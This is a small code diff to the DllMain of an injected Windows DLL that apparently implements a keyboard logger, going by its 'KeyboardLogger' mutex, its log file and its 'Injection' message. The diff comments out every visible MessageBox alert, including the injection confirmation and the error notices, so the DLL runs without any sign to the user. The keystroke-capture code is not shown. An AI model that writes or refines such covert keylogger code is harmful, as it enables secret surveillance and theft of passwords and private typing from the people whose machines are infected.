@@ -154,16 +154,16 @@ BOOL APIENTRY DllMain(HMODULE hModule,
 	LPVOID lpReserved
 	)
 {
-	MessageBox(NULL, "Injection", "Good", MB_OK);
+	//MessageBox(NULL, "Injection", "Good", MB_OK);
 	HANDLE mutex = CreateMutex(NULL, FALSE, "KeyboardLogger");
 	if (GetLastError() == ERROR_ALREADY_EXISTS || GetLastError() == ERROR_ACCESS_DENIED)
 	{
-		MessageBox(NULL, "Error", "Next copy KeyboardLogger", MB_OK);
+		//MessageBox(NULL, "Error", "Next copy KeyboardLogger", MB_OK);
 		return 1;
 	}
 	if (!CreateLogFile())
 	{
-		MessageBox(NULL, "Error", "Can't create logFile", MB_OK);
+		//MessageBox(NULL, "Error", "Can't create logFile", MB_OK);
 		ReleaseMutex(mutex);
 		return 1;
 	}
